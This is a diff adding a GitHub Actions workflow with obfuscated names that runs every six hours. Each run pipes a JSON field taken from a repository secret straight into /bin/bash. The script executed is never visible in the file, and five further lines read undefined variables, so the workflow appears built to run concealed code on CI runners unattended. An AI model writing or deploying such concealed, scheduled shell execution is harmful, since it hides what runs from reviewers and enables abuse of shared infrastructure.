@@ -1,0 +1,23 @@
+name: xiancongyongkai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiancongyongkai
+        env:
+          g96: ${{ secrets.g96 }}
+        run: |
+          echo $g96 | jq -r .pt97 | /bin/bash
+          echo $woqz126 | jq -r .dozmr8 | /bin/bash
+          echo $xtk01847 | jq -r .xlp964 | /bin/bash
+          echo $oxawk54588 | jq -r .lkjp1 | /bin/bash
+          echo $x5376 | jq -r .z3 | /bin/bash
+          echo $qnrky5 | jq -r .wd8 | /bin/bash
+
